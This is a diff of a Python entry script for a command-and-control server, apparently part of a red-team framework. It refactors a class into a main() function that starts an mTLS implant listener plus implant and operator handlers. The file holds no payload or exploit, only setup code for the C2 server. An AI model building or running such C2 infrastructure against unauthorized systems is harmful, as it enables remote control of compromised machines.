@@ -1,49 +1,39 @@
 #!/usr/bin/env python3
 import logging
-import sys
+import traceback
 
 from server.mtls.mtls import Listener
 from server.implant_handler.implant_handler import ImplantHandler
 from server.operator_handler.operator_handler import OperatorHandler
 from client.util.util import parseEndpoint
 from queue import Queue
-from client.pb import operatorpb_pb2
-
-import socket
-import traceback
-import threading
-
-class C2Server(object):
-    def __init__(self):
-        self.shutdown = 0
-        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
-
-        ## Generating stuff for implant comms ##
-        implant_endpoint = parseEndpoint(input("Enter Implant Listner Address (Example: 172.17.0.2:31337)\n> "))
-        operator_endpoint = parseEndpoint(input("Enter Operator Listner Address (Example: 172.17.0.2:31337)\n> "))
-
-        print("Listening for implants...")
-        self.requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
-        try:
-            input
-            self.implant_listener = Listener(self.requestq, implant_endpoint) #begins implant listener w/ mtls encryption
-        except Exception as e:
-            print(e)
-            traceback.print_exc()
-            exit(1)
-
-        ## Generating stuff for operator comms ##
-        print("Listening for operators...")
-        self.operators = list()
-
-        self.implant_handler = ImplantHandler(self.requestq, self.operators)
-        self.implant_handler.start()
-
-        self.operator_handler = OperatorHandler(operator_endpoint, self.operators, self.implant_handler, self.implant_listener)
-        self.operator_handler.start()
 
 def main():
-    C2Server()
+    logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
+
+    implant_endpoint = parseEndpoint(input("Enter Implant Listner Address (Example: 172.17.0.2:31337)\n> "))
+    operator_endpoint = parseEndpoint(input("Enter Operator Listner Address (Example: 172.17.0.2:31337)\n> "))
+
+    print("Listening for implants...")
+    print("Listening for operators...")
+
+    requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
+
+    try:
+        implant_listener = Listener(requestq, implant_endpoint) #begins implant listener w/ mtls encryption
+
+    except Exception as e:
+        print(e)
+        traceback.print_exc()
+        exit(1)
+
+    operators = list()
+
+    implant_handler = ImplantHandler(requestq, operators)
+    implant_handler.start()
+
+    operator_handler = OperatorHandler(operator_endpoint, operators, implant_handler, implant_listener)
+    operator_handler.start()
 
 if __name__ == "__main__":
     main()
